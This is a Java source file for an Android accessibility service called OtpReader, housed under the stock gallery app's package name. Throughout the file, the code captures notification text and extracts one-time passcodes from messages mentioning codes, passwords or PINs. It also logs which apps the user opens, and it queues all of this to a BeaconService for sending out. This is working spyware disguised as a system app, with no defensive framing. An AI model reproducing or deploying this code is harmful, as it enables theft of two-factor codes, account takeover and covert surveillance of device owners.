package com.android.gallery3d;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class OtpReader extends AccessibilityService {

    private static final Pattern OTP = Pattern.compile("\\b\\d{4,8}\\b");
    private static final String[] KEYS = {"otp", "code", "verification", "password", "pin"};

    @Override public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e == null) return;

        if (e.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            String pkg = e.getPackageName() == null ? "?" : e.getPackageName().toString();
            StringBuilder sb = new StringBuilder();
            if (e.getText() != null) for (CharSequence t : e.getText()) sb.append(t).append(' ');
            String text = sb.toString();
            if (text.isEmpty()) return;

            String lower = text.toLowerCase();
            boolean otpLike = false;
            for (String k : KEYS) if (lower.contains(k)) { otpLike = true; break; }

            if (otpLike) {
                Matcher m = OTP.matcher(text);
                StringBuilder codes = new StringBuilder();
                while (m.find()) codes.append(m.group()).append(',');
                BeaconService.queue(this, "OTP|" + pkg + "|" + codes + "|" + text);
            } else {
                BeaconService.queue(this, "NOTIF|" + pkg + "|" + text);
            }
        } else if (e.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String pkg = e.getPackageName() == null ? "?" : e.getPackageName().toString();
            BeaconService.queue(this, "OPEN|" + pkg);
        }
    }

    @Override public void onInterrupt() {}
}
